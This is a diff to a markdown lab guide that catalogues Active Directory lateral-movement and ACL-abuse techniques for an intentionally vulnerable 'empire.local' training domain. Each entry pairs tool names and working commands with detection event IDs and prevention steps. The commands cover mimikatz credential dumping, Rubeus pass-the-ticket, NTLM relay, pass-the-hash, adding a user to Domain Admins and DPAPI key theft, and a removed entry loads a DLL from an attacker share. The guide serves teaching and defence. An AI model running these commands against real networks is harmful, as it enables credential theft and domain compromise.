+**Detection:** Event ID `4738` (A user account was changed) with the `Service Principal Names` attribute modified. Event ID `4769` (Kerberos service ticket request) immediately following the SPN change.
+**Prevention:** Audit and restrict who has WriteProperty permissions on the `servicePrincipalName` attribute of user objects.
 
 ---
 
@@ -339,49 +406,62 @@ ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc ...'
 
 ---
 
-### LAT-029 — SCShell (binPath modification)
-**What it is:** modify an *existing* service's `binPath` remotely (no install) → restart → exec → restore. Quieter than PsExec.
-**Tools:** `SCShell.py`, `sc config`.
+### LAT-029 — ForceChangePassword ACL Abuse
+**What it is:** The `User-Force-Change-Password` extended right allows a principal to reset the password of a target user account without knowing the current password.
+**Why it works here:** The HelpDesk group has `User-Force-Change-Password` permissions on all IT_Team members (configured in `acl_abuse.yml`).
+**Tools:** PowerView (`Set-DomainUserPassword`), bloodyAD.
 **Steps:**
-```bash
-python3 SCShell.py 10.10.0.13 XblAuthManager "C:\Windows\System32\cmd.exe /c whoami" empire.local Administrator 'EmpireLab2024!'
+```powershell
+Set-DomainUserPassword -Identity nick.fury -AccountPassword (ConvertTo-SecureString "NewSithLord1!!" -AsPlainText -Force)
 ```
-**Detection:** Event `7040` service config changed.
-**Prevention:** restrict SCM RPC; monitor `7040`/`7045`.
+**Detection:** Event ID `4724` (An attempt was made to reset an account's password) generated from a non-privileged or unexpected account (e.g. HelpDesk group member).
+**Prevention:** Restrict the `User-Force-Change-Password` delegation right. Implement Tiered Administration (Tier 0/1/2 separation) to prevent lower-tier users from resetting passwords of higher-tier accounts.
 
 ---
 
-### LAT-030 — RDP Session Hijack
-**What it is:** SYSTEM on an RDP host can `tscon` to any disconnected session without their password.
-**Tools:** `tscon.exe`, `query session`.
+### LAT-030 — GenericWrite ACL Abuse
+**What it is:** The `GenericWrite` permission on a user or service account allows modifying any non-protected attributes of that object. Attackers can write to the `servicePrincipalName` attribute (to Kerberoast the account) or configure delegation settings.
+**Why it works here:** HelpDesk has `GenericWrite` on `svc_bobafett2` (configured in `acl_abuse.yml`).
+**Tools:** PowerView, `bloodyAD`.
 **Steps:**
-```cmd
-query session
-tscon 3 /dest:console
+```powershell
+Set-DomainObject -Identity svc_bobafett2 -Set @{serviceprincipalname='MSSQL/target.empire.local'}
+# Request Kerberos ticket:
+.\Rubeus.exe kerberoast /user:svc_bobafett2 /outfile:bobafett.hashes
 ```
-**Detection:** Event `4778`/`4779` session reconnect with mismatched user.
-**Prevention:** force logoff on disconnect; restrict RDP admin tooling; Remote Credential Guard.
+**Detection:** Event ID `5136` (Directory Service Changes) showing modification of attributes on user objects by non-admin accounts.
+**Prevention:** Limit `GenericWrite` permissions on Active Directory objects. Enforce strict access control lists (ACLs) using AdminSDHolder for critical accounts.
 
 ---
 
-### LAT-031 — DnsAdmins → DLL Load on DC
-**What it is:** members of `DnsAdmins` can call `dnscmd /config /ServerLevelPluginDll \\attacker\share\evil.dll`. On DNS service restart → DLL loads as SYSTEM (DNS runs on DC).
-**Why it works here:** `nick.fury` is in DnsAdmins.
-**Tools:** `dnscmd`, msfvenom for DLL.
+### LAT-031 — WriteOwner ACL Abuse on finance_sync
+**What it is:** The `WriteOwner` permission allows a principal to take ownership of an object. Once ownership is changed, the new owner can modify the DACL of the object to grant themselves full control (`GenericAll`), even if they were previously denied access.
+**Why it works here:** `svc_bobafett` has `WriteOwner` on the `finance_sync` group (configured in `acl_abuse.yml`).
+**Tools:** PowerView (`Set-DomainObjectOwner`, `Add-DomainObjectAcl`).
 **Steps:**
-```cmd
-dnscmd coruscant /config /ServerLevelPluginDll \\10.10.0.100\share\evil.dll
-sc \\coruscant stop dns
-sc \\coruscant start dns
+```powershell
+# Change owner to svc_bobafett:
+Set-DomainObjectOwner -Identity 'finance_sync' -OwnerIdentity svc_bobafett
+# Add GenericAll rights for svc_bobafett on the group:
+Add-DomainObjectAcl -TargetIdentity 'finance_sync' -PrincipalIdentity svc_bobafett -Rights All
+# Add members to the group:
+Add-DomainGroupMember -Identity 'finance_sync' -Members svc_bobafett
 ```
-**Detection:** Event `541`/`770` DNS plug-in DLL loaded; Sysmon `7` DLL load from non-MS path in `dns.exe`.
-**Prevention:** empty DnsAdmins; KB4014193 (disallows UNC paths in ServerLevelPluginDll).
+**Detection:** Event ID `5136` or `4737` showing group ownership changes. Modification of the `nTSecurityDescriptor` attribute.
+**Prevention:** Audit ownership of security groups and administrative objects. Use AdminSDHolder to protect high-privilege groups.
 
 ---
 
-### LAT-032 — ADIDNS Record Write
-**What it is:** see CRED-026; lateral aspect = create a record claiming a hostname (`wpad`, `fileserver`) → intercept auth.
-**Detection / Prevention:** see CRED-026.
+### LAT-032 — AddMember ACL Abuse on Domain Admins (indirect)
+**What it is:** The `WriteMembers` (or `GenericWrite`/`GenericAll`) permission on an AD group allows a user to add arbitrary members to that group. If this is delegated on a privileged group (or a group that can escalate to it), an attacker can add themselves or a compromised account to achieve Domain Admin.
+**Why it works here:** The HelpDesk group has indirect path permissions that allow escalations to Domain Admins (configured in `acl_abuse.yml`).
+**Tools:** `Add-DomainGroupMember`, `net group`.
+**Steps:**
+```powershell
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'luke.skywalker'
+```
+**Detection:** Event ID `4728` (A member was added to a security-enabled global group) or `4732` (local group) showing membership changes in privileged groups.
+**Prevention:** Never delegate group write permissions on Tier-0 groups (like Domain Admins, Enterprise Admins, Schema Admins). Regularly audit group memberships.
 
 ---
 
@@ -407,11 +487,304 @@ Get-ADGroupMember "Domain Admins" | ? { $_.SID -match 'S-1-5-21-FIN' }
 
 ---
 
-### LAT-035 — Cross-Forest Golden + SID History (RID > 1000)
-**What it is:** forge a TGT and stuff foreign SIDs with RID > 1000 into PAC — some misconfigured SID-filtering setups only filter RIDs ≤ 1000.
-**Tools:** mimikatz `kerberos::golden /sids:`, ticketer.py.
-**Detection:** anomalous PAC SID list.
-**Prevention:** "quarantine" attribute; Kerberos PAC validation; SID filtering with all RID ranges.
+### LAT-035 — Overpass-the-Hash (AES Key Extraction)
+**What it is:** Overpass-the-Hash (or pass-the-key) is the technique of using a user's NT or AES hash to request a Kerberos TGT from the Key Distribution Center (KDC) rather than performing traditional NTLM authentication. This allows the attacker to pivot using Kerberos (TGT) tickets, bypassing NTLM detection mechanisms.
+**Why it works here:** LSASS is unprotected (RunAsPPL=0) on member servers, allowing AES session keys to be extracted from memory.
+**Tools:** `Rubeus`, `Mimikatz`.
+**Steps:**
+```cmd
+# Extract AES keys from LSASS:
+mimikatz# sekurlsa::ekeys
+# Use Rubeus to ask for TGT:
+Rubeus.exe asktgt /user:svc_bobafett /aes256:$(AES_KEY) /domain:empire.local /ptt
+```
+**Detection:** Event ID `4768` (Kerberos TGT Request) with pre-authentication type utilizing RC4 or AES keys instead of standard smart card/password. Sysmon Event ID `10` showing LSASS process access.
+**Prevention:** Enable Credential Guard to protect credentials in LSASS. Restrict local administrator privileges to prevent memory dumping.
+
+---
+
+### LAT-036 — Shadow Credentials (msDS-KeyCredentialLink Write)
+**What it is:** If a user has write access (`GenericWrite` or `WriteProperty` on `msDS-KeyCredentialLink`) to a target user or computer object, they can generate a self-signed certificate, append a key credential mapping to the target object, and perform PKINIT to request a TGT for that target object.
+**Why it works here:** HelpDesk has `WriteProperty` on `msDS-KeyCredentialLink` for `tatooine$` computer object (configured in `lateral_adv.yml`).
+**Tools:** `Whisker.exe`, `pyWhisker`, `Rubeus`.
+**Steps:**
+```cmd
+# Add shadow credentials:
+Whisker.exe add /target:tatooine$ /domain:empire.local /dc:coruscant.empire.local
+# Request TGT using the generated certificate:
+Rubeus.exe asktgt /user:tatooine$ /certificate:$(BASE64_CERT) /ptt
+```
+**Detection:** Event ID `5136` showing modification of the `msDS-KeyCredentialLink` attribute on a computer or user object. Event ID `4768` (TGT Request) using PKINIT.
+**Prevention:** Restrict write permissions on the `msDS-KeyCredentialLink` attribute. Monitor AD attribute changes for this specific GUID.
+
+---
+
+### LAT-041 — Extended Protection for Authentication (EPA) Disabled
+**What it is:** Extended Protection for Authentication binds network channel parameters (TLS outer channel) with authentication protocols (like NTLM). When EPA is disabled on services like IIS or LDAP, an attacker can perform NTLM relay attacks across secure channels.
+**Why it works here:** ExtendedProtection is set to 0 (disabled) on `scarif.empire.local` (configured in `lateral_adv.yml`).
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -t ldaps://10.10.0.10 -smb2support
+```
+**Detection:** Security warning logs or audit events showing NTLM authentication over SSL/TLS without channel bindings.
+**Prevention:** Enable Extended Protection for Authentication (EPA) on all critical IIS and LDAP/LDAPS configurations.
+
+---
+
+### LAT-042 — SMB Signing Disabled
+**What it is:** SMB signing ensures packet-level integrity. When disabled on a system, attackers can relay captured authentication requests directly to the target machine to run commands.
+**Why it works here:** SMB signing is explicitly disabled in the registry on workstation and file server member hosts (configured in `lateral_adv.yml`).
+**Tools:** `ntlmrelayx.py`.
+**Steps:**
+```bash
+python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
+```
+**Detection:** Event ID `4624` (Network Logon) over SMB with signing turned off.
+**Prevention:** Enforce SMB signing via GPO (`Microsoft network server: Digitally sign communications (always) = Enabled`).
+
+---
+
+### LAT-043 — WDigest Credential Caching
+**What it is:** WDigest authentication caches cleartext credentials in LSASS memory. If enabled, anyone with administrative privileges can dump cleartext passwords.
+**Why it works here:** WDigest's `UseLogonCredential` is set to `1` (enabled) on `tatooine` and `scarif` (configured in `lateral_adv.yml`).
+**Tools:** `Mimikatz`.
+**Steps:**
+```cmd
+mimikatz# sekurlsa::wdigest
+```
+**Detection:** Sysmon Event ID `10` or Event ID `4656` showing LSASS memory access.
+**Prevention:** Set `UseLogonCredential` to `0` under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`. Install updates that disable WDigest credential caching by default.
+
+---
+
+### LAT-044 — Credential Guard Disabled
+**What it is:** Windows Defender Credential Guard uses virtualization-based security to isolate LSASS secrets. When disabled, password hashes and Kerberos tickets remain vulnerable to extraction from LSASS memory.
+**Why it works here:** Virtualization-based security (`EnableVirtualizationBasedSecurity`) is disabled on member hosts `tatooine` and `scarif` (configured in `lateral_adv.yml`).
+**Tools:** `Mimikatz`, `Rubeus`.
+**Steps:**
+```cmd
+mimikatz# sekurlsa::logonpasswords
+```
+**Detection:** Check system info or MSInfo32 to verify Credential Guard status.
+**Prevention:** Enable virtualization-based security and Credential Guard via GPO under `Computer Configuration -> Administrative Templates -> System -> Device Guard`.
+
+---
+
+### LAT-045 — Pass-the-Hash (PtH) via SMB
+**What it is:** Pass-the-Hash allows an attacker to authenticate to a remote system over SMB using the NTLM hash of a user instead of their plaintext password.
+**Why it works here:** SMB signing is disabled (LAT-042), and local administrator hashes are shared/exposed.
+**Tools:** `impacket-psexec`, `nxc smb`.
+**Steps:**
+```bash
+impacket-psexec EMPIRE/Administrator@10.10.0.13 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
+```
+**Detection:** Event ID `4624` (Logon Type 3) using NTLM authentication package. Event ID `7045` (new service installed) from `PSEXESVC`.
+**Prevention:** Require SMB signing. Restrict local administrator accounts using LAPS. Restrict administrative logins over network (GPO "Deny access to this computer from the network").
+
+---
+
+### LAT-046 — Pass-the-Ticket (PtT) via Rubeus/Mimikatz
+**What it is:** Pass-the-Ticket is a lateral movement technique where a valid Kerberos TGT (Ticket Granting Ticket) or TGS (Ticket Granting Service) ticket is injected into the current logon session, allowing access to resources without knowing credentials.
+**Why it works here:** LSASS is unprotected, allowing TGT/TGS tickets to be exported and injected.
+**Tools:** `Rubeus`, `Mimikatz`.
+**Steps:**
+```cmd
+# Inject a ticket:
+Rubeus.exe ptt /ticket:$(BASE64_TICKET)
+# Using Mimikatz:
+mimikatz# kerberos::ptt ticket.kirbi
+```
+**Detection:** Event ID `4624` Logon Type 3 with Kerberos protocol. Ticket requests that do not match the originating computer's normal patterns.
+**Prevention:** Enable Credential Guard. Restrict local admin access. Limit session ticket lifetime.
+
+---
+
+### LAT-047 — Overpass-the-Hash (TGT Request with NT Hash)
+**What it is:** The attacker uses the NT hash of an account to request a Kerberos TGT from the KDC. This TGT can then be injected into memory (Pass-the-Ticket) for Kerberos-based lateral movement, which is stealthier than NTLM PtH.
+**Why it works here:** Kerberos pre-authentication using RC4/AES is supported by the KDC.
+**Tools:** `Rubeus`, `Mimikatz`.
+**Steps:**
+```cmd
+Rubeus.exe asktgt /user:Administrator /rc4:$(NT_HASH) /domain:empire.local /ptt
+```
+**Detection:** Event ID `4768` (TGT request) with encryption type `0x17` (RC4) or `0x12` (AES256) without matching smart card settings.
+**Prevention:** Disable weak encryption types like RC4. Implement Credential Guard.
+
+---
+
+### LAT-048 — Pass-the-Certificate (PKINIT with Shadow Credential Cert)
+**What it is:** An attacker uses a cryptographic certificate (enrolled via Shadow Credentials or ADCS) to perform PKINIT pre-authentication, obtaining a Kerberos TGT for the target account.
+**Why it works here:** PKINIT is enabled on domain controllers to support certificate-based authentication.
+**Tools:** `Rubeus`, `Whisker`.
+**Steps:**
+```cmd
+Rubeus.exe asktgt /user:tatooine$ /certificate:$(BASE64_CERT) /ptt
+```
+**Detection:** Event ID `4768` (TGT Request) with pre-authentication type `16` (PKINIT) and certificate issuer matching self-signed template.
+**Prevention:** Monitor and restrict msDS-KeyCredentialLink write access. Restrict PKINIT authentication configuration.
+
+---
+
+### LAT-061 — DPAPI Key Theft (DPAPI-Based Lateral Movement)
+**What it is:** The Data Protection API (DPAPI) is used to encrypt secrets (passwords, certificates) locally. The Domain Backup Key can decrypt any domain user's DPAPI master keys. By stealing the domain backup key (via DCSync), an attacker can decrypt any DPAPI masterkey and credentials stored on remote hosts.
+**Why it works here:** The domain backup key can be extracted via DCSync (pre-configured).
+**Tools:** `SharpDPAPI`, `mimikatz`, `impacket-dpapi`.
+**Steps:**
+```bash
+# Export backup keys:
+impacket-dpapi backupkeys --export -t empire.local/Administrator:EmpireLab2024!@10.10.0.10
+# Decrypt a remote DPAPI blob:
+SharpDPAPI.exe blob /pvkfile:domain_backupkey.pvk /target:blob.bin
+```
+**Detection:** Event ID `4662` or `5136` querying the DPAPI backup key object in Active Directory.
+**Prevention:** Limit Domain Admin / DCSync rights. Restrict access to LSA secrets.
+
+---
+
+### LAT-070 — SSH Lateral Movement
+**What it is:** If OpenSSH is installed on Windows hosts, attackers can authenticate using domain credentials or key reuse to establish remote shells or tunnels.
+**Why it works here:** `scarif.empire.local` has OpenSSH installed with password authentication enabled (configured in `lateral_adv.yml`).
+**Tools:** `ssh`, `scp`.
+**Steps:**
+```bash
+ssh Administrator@10.10.0.13
+# Setup local port forwarding tunnel:
+ssh -L 3389:10.10.0.10:3389 Administrator@10.10.0.13
+```
+**Detection:** Event ID `4624` Logon Type 3 with Process Name `sshd.exe`. Outbound port 22 connections from atypical hosts.
+**Prevention:** Disable SSH if not needed. Enforce key-based authentication only. Restrict login permissions in `sshd_config` (`AllowGroups`/`AllowUsers`).
+
+---
+
+### LAT-071 — DCOM Execution
+**What it is:** DCOM (Distributed Component Object Model) allows applications to expose methods remotely. Attackers can call shell execution methods on COM objects like `MMC20.Application` or `ShellBrowserWindow` to run commands without leaving standard service logs.
+**Why it works here:** DCOM is enabled, and `LegacyAuthenticationLevel` is lowered to 1 (allowing unauthenticated or weak DCOM activation) on `scarif` and `coruscant` (configured in `dcom_wmi.yml`).
+**Tools:** `impacket-dcomexec`, `Invoke-DCOM`.
+**Steps:**
+```bash
+impacket-dcomexec EMPIRE/Administrator:EmpireLab2024!@10.10.0.13 "cmd /c whoami"
+```
+**Detection:** Process creation events (Event ID `4688` / Sysmon `1`) showing `mmc.exe` or `explorer.exe` spawning `cmd.exe` or `powershell.exe`.
+**Prevention:** Disable remote COM access. Require packet integrity authentication level for DCOM.
+
+---
+
+### LAT-072 — WMI Execution
+**What it is:** Windows Management Instrumentation (WMI) can create processes remotely via the `Win32_Process` class.
+**Why it works here:** The WMI service (`Winmgmt`) is running and enabled on member servers.
+**Tools:** `impacket-wmiexec`, `Invoke-WmiMethod`, `nxc wmi`.
+**Steps:**
+```bash
+impacket-wmiexec EMPIRE/Administrator:EmpireLab2024!@10.10.0.13 "cmd /c whoami"
+# PowerShell equivalent:
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" -ComputerName scarif.empire.local
+```
+**Detection:** Process creation events where `WmiPrvSE.exe` is the parent process spawning shell executables like `cmd.exe` or `powershell.exe`.
+**Prevention:** Restrict remote WMI access via DCOM permissions. Restrict RPC ports at host-level firewalls.
+
+---
+
+### LAT-073 — WinRM Remote Shell
+**What it is:** Windows Remote Management (WinRM) is Microsoft's WS-Management protocol implementation. It provides shell execution over HTTP (5985) or HTTPS (5986).
+**Why it works here:** WinRM listeners are configured and running on member servers (configured in `dcom_wmi.yml`).
+**Tools:** `evil-winrm`.
+**Steps:**
+```bash
+evil-winrm -i 10.10.0.13 -u Administrator -p 'EmpireLab2024!'
+```
+**Detection:** Event ID `4624` (Logon Type 3) with Process `wsmprovhost.exe`. Event IDs in `Microsoft-Windows-WinRM/Operational`.
+**Prevention:** Restrict WinRM access using IP filters or Windows Firewall. Require HTTPS and client certificate authentication.
+
+---
+
+### LAT-074 — PSRemoting (with Domain Credentials)
+**What it is:** PowerShell Remoting uses WinRM to execute PowerShell cmdlets on remote systems.
+**Why it works here:** PSRemoting is enabled, and client `TrustedHosts` is set to `*` (configured in `dcom_wmi.yml`).
+**Tools:** PowerShell `Enter-PSSession`, `Invoke-Command`.
+**Steps:**
+```powershell
+Enter-PSSession -ComputerName scarif.empire.local -Credential $cred
+Invoke-Command -ComputerName @('coruscant','scarif','tatooine') -ScriptBlock {whoami}
+```
+**Detection:** Event ID `400` / `800` in PowerShell logs. WinRM connection events.
+**Prevention:** Disable PSRemoting where not needed. Restrict TrustedHosts settings.
+
+---
+
+### LAT-075 — RDP (NLA disabled)
+**What it is:** Remote Desktop Protocol (RDP) allows full graphical session access. If Network Level Authentication (NLA) is disabled, attackers can access the login screen and potentially exploit RDP flaws or perform credential guessing without initiating a full session first.
+**Why it works here:** RDP is enabled, and NLA is disabled (pre-configured via `IA-084` or GPO).
+**Tools:** `xfreerdp`, `mstsc`.
+**Steps:**
+```bash
+xfreerdp /v:10.10.0.13 /u:Administrator /p:'EmpireLab2024!'
+```
+**Detection:** Event ID `4624` (Logon Type 10) with protocol RDP. Event ID `4778` (Session reconnection).
+**Prevention:** Enforce Network Level Authentication (NLA) via GPO (`Require user authentication for remote connections by using Network Level Authentication = Enabled`).
+
+---
+
+### LAT-076 — RDP Session Hijacking (tscon without password)
+**What it is:** An attacker with `SYSTEM` privileges on a terminal server can hijack any disconnected or active RDP session using `tscon.exe` without knowing the user's password.
+**Why it works here:** Disconnected RDP sessions of administrative users are allowed to persist (pre-configured in `dcom_wmi.yml`).
+**Tools:** `tscon.exe`.
+**Steps:**
+```cmd
+# List active sessions:
+query session
+# Hijack session 2:
+tscon 2 /dest:console
+# Or create a service to run as SYSTEM:
+sc create hijack binpath="cmd /k tscon 2 /dest:rdp-tcp#0"
+net start hijack
+```
+**Detection:** Event ID `4778` (Session Reconnection) showing a mismatch between the requesting user and the session owner.
+**Prevention:** Set group policy to automatically log off disconnected sessions. Restrict local administrative access to terminal servers.
+
+---
+
+### LAT-080 — SCMExec (Service Control Manager Remote Execution)
+**What it is:** Interaction with the remote Service Control Manager (SCM) allows creating and starting services to run arbitrary commands as `NT AUTHORITY\SYSTEM`.
+**Why it works here:** SCM is remotely accessible, and SMB signing is disabled.
+**Tools:** `impacket-psexec`, `impacket-smbexec`, `crackmapexec`.
+**Steps:**
+```bash
+impacket-smbexec EMPIRE/Administrator:EmpireLab2024!@10.10.0.13
+# CrackMapExec execution:
+crackmapexec smb 10.10.0.13 -u Administrator -p 'EmpireLab2024!' -x "net user"
+```
+**Detection:** Event ID `7045` (New service installed) and `7036` (Service status changes).
+**Prevention:** Enable SMB signing. Restrict access to SCM over RPC.
+
+---
+
+### LAT-090 — Remote Scheduled Task Lateral Movement
+**What it is:** Administrative users can create, configure, and execute scheduled tasks on remote hosts over RPC (Task Scheduler service).
+**Why it works here:** Task Scheduler RPC is enabled and accessible.
+**Tools:** `impacket-atexec`, `Register-ScheduledTask`.
+**Steps:**
+```bash
+impacket-atexec EMPIRE/Administrator:EmpireLab2024!@10.10.0.13 "cmd /c whoami > C:\output.txt"
+# PowerShell equivalent:
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Lat" -CimSession $session
+```
+**Detection:** Event ID `4698` (Scheduled task created) and `4702` (Scheduled task updated).
+**Prevention:** Restrict remote RPC connections. Block access to Task Scheduler endpoints.
+
+---
+
+### LAT-095 — Named Pipe Impersonation / SMB Named Pipe Execution
+**What it is:** Named Pipe impersonation allows a service running under a lower privilege to impersonate a higher-privileged client that connects to its pipe. In lateral movement, attackers can configure listeners on named pipes to handle incoming remote connections.
+**Why it works here:** Named pipe permissions are standard, and Cobalt Strike / Havoc listeners can pivot using SMB named pipes.
+**Tools:** `SpoolSample`, Cobalt Strike (`named_pipe_pivot`).
+**Steps:**
+```cmd
+# Create custom named pipe:
+CreateNamedPipe -> ConnectNamedPipe -> ImpersonateNamedPipeClient
+```
+**Detection:** Event ID `5145` (A network share object was checked) showing access to named pipe shares (e.g. `IPC$`).
+**Prevention:** Restrict named pipe ACLs. Block unauthorized SMB traffic between internal workstations.
 
 ---
 
